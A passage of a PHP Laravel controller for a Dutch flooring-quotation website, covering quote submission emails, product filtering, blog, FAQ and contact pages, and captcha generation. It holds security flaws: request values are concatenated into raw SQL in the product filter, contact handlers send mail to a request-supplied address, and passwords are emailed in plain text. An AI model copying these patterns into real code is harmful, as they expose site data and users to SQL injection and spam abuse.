                            $answers = '';
                        }

                    }
                    else
                    {
                        $answers = $request->$answer;
                    }

                    $post = new requests_q_a;
                    $post->request_id = $quote->id;
                    $post->question = $key;
                    $post->answer = $answers;
                    $post->save();
                }
            }

            if($account_create)
            {
                $link = url('/') . '/aanbieder/quotation-requests';

                if($this->lang->lang == 'du')
                {
                    $msg = "Beste " . $user_name . ",<br><br>De offerte aanvraag, die je via Vloerofferte hebt ingestuurd, is zojuist bij ons binnen gekomen en heeft als referentienummer gekregen: ".$quote_number.".<br><br><b>Hoe nu verder?</b><br><br>1. De aanvraag is bij ons binnen gekomen<br>2. We hebben je aanvraag doorgestuurd naar de aanbieders<br>3. Je krijgt reacties en offertes van de aanbieders<br><br><b>Persoonlijk dashboard</b><br><br>Ook hebben we een handig dashboard voor je ingericht waar je altijd en overal de status van jouw offerte kan inzien. <a href='" . $link . "'>Klik hier</a> om naar je persoonlijke dashboard te gaan.<br><br>Je wachtwoord: " . $password . "<br><br><b>Vragen?</b><br><br>Dat kan heel eenvoudig door deze mail te beantwoorden.<br><br>Met vriendelijke groeten,<br><br>Vloerofferte";
                }
                else
                {
                    $msg = "Dear Mr/Mrs " . $user_name . ",<br><br>Your account has been created and your quotation request has been submitted successfully. Kindly complete your profile and change your password. You can go to your dashboard through <a href='" . $link . "'>here.</a><br><br>Your Password: " . $password . "<br><br>Kind regards,<br><br>Klantenservice<br><br> Vloerofferte";
                }

                try{
                    \Mail::send(array(), array(), function ($message) use ($msg, $user_email, $user_name, $link, $password) {
                        $message->to($user_email)
                            ->from('info@vloerofferte.nl')
                            ->subject(__('text.Account Created!'))
                            ->setBody($msg, 'text/html');
                    });
                }
                catch(\Exception $e){
                    return redirect()->back();
                }
            }
            else
            {
                $link = url('/') . '/aanbieder/quotation-requests';

                if($this->lang->lang == 'du')
                {
                    $msg = "Beste " . $user_name . ",<br><br>We hebben je offerte aanvraag ontvangen en doorgestuurd naar de aanbieders. Je kan je aanvraag volgen in je account, <a href='" . $link . "'>klik hier</a> om naar je account te gaan.<br><br>Met vriendelijke groeten,<br><br>Klantenservice<br><br> Vloerofferte";
                }
                else
                {
                    $msg = "Dear Mr/Mrs " . $user_name . ",<br><br>Your quotation request has been submitted successfully. You can go to your dashboard through <a href='" . $link . "'>here.</a><br><br>Kind regards,<br><br>Klantenservice<br><br> Vloerofferte";
                }

                try{
                    \Mail::send(array(), array(), function ($message) use ($msg, $user_email, $user_name, $link) {
                        $message->to($user_email)
                            ->from('info@vloerofferte.nl')
                            ->subject(__('text.Quotation Request Submitted!'))
                            ->setBody($msg, 'text/html');
                    });

                    $admin_email = $this->sl->admin_email;

                    \Mail::send(array(), array(), function ($message) use ($admin_email, $user_email, $user_name) {
                        $message->to($admin_email)
                            ->from('info@vloerofferte.nl')
                            ->subject(__('text.Quotation Request Submitted!'))
                            ->setBody('Dear Nordin Adoui, A new quote request has been submitted by '.$user_name.'.', 'text/html');
                    });

                }
                catch(\Exception $e){
                    return redirect()->back();
                }
            }


            Session::flash('success', __('text.Your Quotation request has been created successfully!'));
            return redirect()->back();
        }

    }

    public function products(Request $request)
    {
        $range_s = $request->range_start;
        $range_e = $request->range_end;

        $category = $request->category;
        $brand = $request->brand;
        $model = $request->model;
        $size = $request->size;
        $color = $request->color;

        $all_products = Products::leftjoin('estimated_prices','estimated_prices.product_id','=','products.id');

        if($category)
        {
            $all_products = $all_products->where('products.category_id',$category);

            if(!$range_s && !$range_e)
            {
                $range_s = $all_products->min('estimated_prices.price');
                $range_e = $all_products->max('estimated_prices.price');

                if($range_s == NULL && $range_e == NULL)
                {
                    $range_e = 0;
                    $range_s = 0;
                }

                if($range_s == $range_e)
                {
                    $range_e = $range_e + 0.1;
                }

                $request->org_range_start = $range_s;
                $request->org_range_end = $range_e;
            }
        }

        if($brand)
        {
            $all_products = $all_products->where('products.brand_id',$brand);
        }

        if($model)
        {
            $all_products = $all_products->where('products.model_id',$model);
        }

        if($size)
        {
            $all_products = $all_products->whereRaw("find_in_set('".$size."',products.size)");
        }

        if($color)
        {
            $all_products = $all_products->whereRaw("find_in_set('".$color."',products.color)");
        }

        if(is_numeric($range_s) && is_numeric($range_e))
        {
            $s = floatval($range_s);
            $e = floatval($range_e);

            $all_products = $all_products->where(function($query) use($s, $e) {
                $query->where('estimated_prices.price','>=',$s)->where('estimated_prices.price','<=',$e)->orWhere('estimated_prices.price','=',NULL);
            });

            $lowest = $request->org_range_start;
            $highest = $request->org_range_end;
        }
        else
        {
            $highest = estimated_prices::max('price');
            $lowest = estimated_prices::min('price');

            if(!$lowest)
            {
                $lowest = 0;
            }

            if(!$highest)
            {
                $highest = 0.1;
            }

            $s = $lowest;
            $e = $highest;
        }

        $all_products = $all_products->select('products.*','estimated_prices.price')->groupBy('products.id')->paginate(12);

        $filter_brands = Brand::all();
        $filter_models = Model1::all();
        $sizes = Products::where('category_id','=',$request->category)->where('size','!=',NULL)->get();
        $sizes = $sizes->unique('size');
        $colors = Products::where('category_id','=',$request->category)->where('color','!=',NULL)->get();
        $colors = $colors->unique('color');

        return view('front.products',compact('highest','lowest','sizes','colors','all_products','filter_brands','filter_models','s','e','range_s','range_e','category','brand','model','size','color'));
    }


    public function services(Request $request)
    {
        $our_services = Service::groupBy('services.id')->paginate(12);

        return view('front.services',compact('our_services'));
    }

    public function product($id)
    {
        $product = Products::leftjoin('categories','categories.id','=','products.category_id')->leftjoin('brands','brands.id','=','products.brand_id')->leftjoin('models','models.id','=','products.model_id')->where('products.id',$id)->select('products.*','categories.cat_name','brands.cat_name as brand_name','models.cat_name as model_name')->first();

        return view('front.product',compact('product'));
    }

    public function service($id)
    {
        $service = Service::where('id',$id)->first();

        return view('front.service',compact('service'));
    }

    public function subscribe(Request $request)
    {
        $this->validate($request, [
            'email' => 'unique:subscribers',
        ],
            [
                'email.unique' => $this->lang->euv,
            ]);
        $subscribe = new Subscriber;
        $subscribe->fill($request->all());
        $subscribe->save();
        Session::flash('subscribe', $this->lang->yasst);
        return redirect()->route('front.index');
    }

    public function blogshow($id)
    {
        $blog = Blog::where('title',$id)->first();
        $old = $blog->views;
        $new = $old + 1;
        $blog->views = $new;
        $blog->update();
        $lblogs = Blog::orderBy('created_at', 'desc')->limit(4)->get();
        return view('front.blogshow', compact('blog', 'lblogs'));

    }

    public function faq()
    {
        $ps = Pagesetting::findOrFail(1);
        if ($ps->f_status == 0) {
            return redirect()->route('front.index');
        }
        $faqs = Faq::all();
        return view('front.faq', compact('faqs'));
    }

    public function about()
    {
        $ps = Pagesetting::findOrFail(1);
        if ($ps->a_status == 0) {
            return redirect()->route('front.index');
        }
        $about = $ps->about;
        return view('front.about', compact('about'));
    }

    public function contact()
    {
        $ps = Pagesetting::findOrFail(1);
        $this->code_image();
        if ($ps->c_status == 0) {
            return redirect()->route('front.index');
        }
        return view('front.contact', compact('ps'));
    }

    //Send email to user
    public function useremail(Request $request)
    {
        $subject = "Email From Of Handyman Profile";
        $to = $request->to;
        $name = $request->name;
        $from = $request->email;
        $msg = "Name: " . $name . "\nEmail: " . $from . "\nMessage: " . $request->message;
        mail($to, $subject, $msg);
        Session::flash('success', 'Email Sent !!');
        return redirect()->back();
    }

    //Send email to user
    public function contactemail(Request $request)
    {
        $value = session('captcha_string');
        if ($request->codes != $value) {
            return redirect()->route('front.contact')->with('unsuccess', 'Please enter Correct Capcha Code.');
        }
        $ps = Pagesetting::findOrFail(1);
        $subject = "Email From Of " . $request->name;
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phone;
        $department = $request->department;
        $from = $request->email;
        $msg = "Name: " . $name . "\nEmail: " . $from . "\nPhone: " . $request->phone . "\nMessage: " . $request->text;
        mail($to, $subject, $msg);
        Session::flash('success', $ps->contact_success);
        return redirect()->route('front.contact');
    }

    public function refresh_code()
    {
        $this->code_image();
        return "done";
    }

    private function code_image()
    {
        $actual_path = str_replace('project', '', public_path());
        $image = imagecreatetruecolor(200, 50);
        $background_color = imagecolorallocate($image, 255, 255, 255);
        imagefilledrectangle($image, 0, 0, 200, 50, $background_color);

        $pixel = imagecolorallocate($image, 0, 0, 255);
        for ($i = 0; $i < 500; $i++) {
            imagesetpixel($image, rand() % 200, rand() % 50, $pixel);
        }

        $font = $actual_path . '/assets/front/fonts/NotoSans-Bold.ttf';


        $allowed_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        $length = strlen($allowed_letters);
        $letter = $allowed_letters[rand(0, $length - 1)];
        $word = '';
        //$text_color = imagecolorallocate($image, 8, 186, 239);
        $text_color = imagecolorallocate($image, 0, 0, 0);
        $cap_length = 6;// No. of character in image
        for ($i = 0; $i < $cap_length; $i++) {
            $letter = $allowed_letters[rand(0, $length - 1)];
            imagettftext($image, 25, 1, 35 + ($i * 25), 35, $text_color, $font, $letter);
            $word .= $letter;
        }
        $pixels = imagecolorallocate($image, 8, 186, 239);
        for ($i = 0; $i < 500; $i++) {
            imagesetpixel($image, rand() % 200, rand() % 50, $pixels);
        }
        session(['captcha_string' => $word]);
        imagepng($image, $actual_path . "/assets/images/capcha_code.png");
    }

    public function deleteDir($dirPath)
    {
        if (!is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }

}
